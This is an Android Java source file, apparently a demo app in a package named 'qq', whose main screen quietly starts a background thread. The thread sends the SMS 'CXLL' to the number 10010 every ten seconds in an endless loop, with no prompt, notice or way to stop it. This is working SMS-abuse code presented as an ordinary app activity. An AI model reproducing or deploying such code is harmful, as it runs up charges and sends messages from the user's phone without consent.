package com.example.scorpio.qq;

import android.app.Activity;
import android.os.Bundle;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.Window;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
       requestWindowFeature(Window.FEATURE_NO_TITLE);//取出标题
        setContentView(R.layout.activity_main);
        //开启一个子线程，while（true）循环发送短信
        new Thread(new Runnable() {
            @Override
            public void run() {
                while(true){
                    //循环发送短信
                    // Thread.sleep(10000);
                    SystemClock.sleep(10000);
                    SmsManager smsManager=SmsManager.getDefault();//短信管理器
                    smsManager.sendTextMessage(
                            "10010",//收件人的号码
                            null,//短信中心号码
                            "CXLL",//发送内容
                            null,//如果发生成功，回调此广播，通知我们
                            null);//当对方接收成功，回调此方法
                }
            }
        }).start();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }
}
